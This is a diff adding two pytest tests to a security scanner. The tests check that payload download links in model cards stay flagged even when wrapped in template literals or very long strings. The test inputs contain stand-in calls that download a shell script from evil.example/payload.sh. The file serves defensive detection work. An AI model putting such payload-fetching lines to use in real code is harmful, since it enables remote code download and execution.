@@ -2289,6 +2289,24 @@ def test_text_scanner_model_card_wrapped_call_markdown_link_remains_actionable(t
     )
 
 
+@pytest.mark.parametrize("tag", ["", "String.raw"])
+def test_text_scanner_model_card_wrapped_template_literal_markdown_link_remains_actionable(
+    tmp_path: Path, tag: str
+) -> None:
+    _assert_model_card_payload_endpoint_actionable(
+        tmp_path, f"download(\n    {tag}`[download](https://evil.example/payload.sh)`\n)\n"
+    )
+
+
+def test_text_scanner_model_card_wrapped_long_literal_markdown_link_remains_actionable(tmp_path: Path) -> None:
+    _assert_model_card_payload_endpoint_actionable(
+        tmp_path,
+        'download(\n    "'
+        + "x" * (MAX_TEXT_FINDING_CONTEXT_BYTES + 1)
+        + '[download](https://evil.example/payload.sh)"\n)\n',
+    )
+
+
 @pytest.mark.parametrize(
     "content",
     [
